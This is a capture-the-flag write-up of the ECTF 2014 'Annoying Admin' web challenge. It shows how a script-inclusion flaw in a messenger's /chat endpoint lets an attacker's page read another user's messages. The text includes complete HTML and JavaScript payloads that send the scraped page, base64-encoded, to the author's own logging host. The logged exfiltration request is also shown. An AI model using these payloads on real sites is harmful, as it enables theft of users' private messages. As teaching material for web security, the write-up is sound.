# Annoying Admin writeup
   ECTF, 2014
   Writeup by make_pizza

This challenge featured a simple web based messenger. Allowing us to 
send messages to people like 'The Admin' and 'The Founder'. The goal was to
extract the message sent to the Admin from the Founder. Since this is a 
messaging application a good place to start is looking for clientside attacks.

We start to probe for XSS by sending malicious scripts to the Admin this would
be Stored-XSS. We first started to test this by injecting scripts which
would cause the script interpreter to make a a request to our domain. Checking
our machine's logs it appeared that these requests were being made, however
any attempt we made in our payload JS to attempt to modify the request 
slightly seemed to fail. For example 

```
window.open('http://mike.pizza?' + 'test');
```

would cause a request to our domain but 'test' would not be sent. 
This was eluding.

Since the challenge went awhile with no solvers we get a hint halfway 
through the game.

'Hint: The admin likes to click on links people send him.'

Let's start looking for a CSRF bug then (a reflected XSS would also be possible
in this case). Right off the bat almost all forms with POST are protected
with a CSRF token, limiting our attack surface. Let's poke around some
of the app's internals by sending some messages to ourself.

Looking at how the app displays the messages we sent to ourself in 
`/chat` we spot that messages are grabbed through an AJAX call. The AJAX 
code does a request to `/chat?sender=$id` where id is the numerical id of 
the user which sent the message. On the AJAX return all the data that was
retrieved is `eval()`'d. Making a manual request to the AJAX resource 
ourselves we notice that the data is (as expected) a bunch of javascript
using jquery.

Resource: `/chat?sender=72`
```

$('#chat_72').html('')$('#chat_72').append('kawaii~~ < /br >')$('#chat_72').append('beer~ < /br >') 

```

Here we can see all the messages userid 72 sent us. They were escaped
then placed into a template of JS code which just appends the text to 
an element of the DOM.

Armed with the knowledge that the admin visits links we send him we
can prepare a malicious webpage that performs CSRF on this AJAX resource.
Since all this sensitive information is nicely placed within JS and we
can get external JS to be executed for us in normal browser execution

eg `<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>`

We can leak messages sent to a user which visits our malicious page.
We can leak the message we sent to ourself with this code.

```
<html>

<body>

<div id="chat_72">
</div>

<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>
<script src="http://212.71.235.214:4050/chat?sender=72"></script>
<script>
</script>

</body>
</html>
```

Our browser sends our session cookie to the resource and our personalized
message JS is sent back and happily executed by our browser. Where the
messages are placed into the div with id "chat_72".

We can also append additional javascript which scrapes the page content 
after the script has loaded and sends it to our logger

```
 window.open('http://mike.pizza/?' + btoa(document.documentElement.innerHTML));
```

So if we want to leak the message sent to the admin from the founder (user id 2).
We just replace the 72 id with 2 add our scrapper javascript and send a link to
this page off to the admin.

```
<html>

<body>

<div id="chat_2">
</div>

<div id="chat_72">
</div>

<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>
<script src="http://212.71.235.214:4050/chat?sender=2"></script>
<script src="http://212.71.235.214:4050/chat?sender=72"></script>

<script>
 window.open('http://mike.pizza/?' + btoa(document.documentElement.innerHTML));
</script>

</body>
</html>
```

In our logger we get an incoming request

```
=== REQUEST FROM [212.71.235.214] -> 2014-10-19 : 03:49:06
GET:
array (
  'PGhlYWQ_PC9oZWFkPjxib2R5PgoKPGRpdiBpZD0iY2hhdF8yIj5mbGFne2JhZF9qc19pc192dWxuZXJhYmxlfTxicj48L2Rpdj4KCjxkaXYgaWQ9ImNoYXRfMTk2Ij5odHRwOi8vMTA0LjEzMS4yMDcuMTE4L2VjdGYvPGJyPjwvZGl2PgoKPHNjcmlwdCBzcmM9Imh0dHA6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTEuMTEuMC5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cDovLzIxMi43MS4yMzUuMjE0OjQwNTAvY2hhdD9zZW5kZXI9MTk2Ij48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHA6Ly8yMTIuNzEuMjM1LjIxNDo0MDUwL2NoYXQ/c2VuZGVyPTIiPjwvc2NyaXB0Pgo8c2NyaXB0PgoJd2luZG93Lm9wZW4oJ2h0dHA6Ly8xMDQuMTMxLjIwNy4xMTgvPycgKyBidG9hKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUwpKTsKPC9zY3JpcHQ_PC9ib2R5Pg' => '=',
)
```

Which when decoded gives us an html doc containing our flag:

```
<div id="chat_2">flag{bad_js_is_vulnerable}<br></div>
```

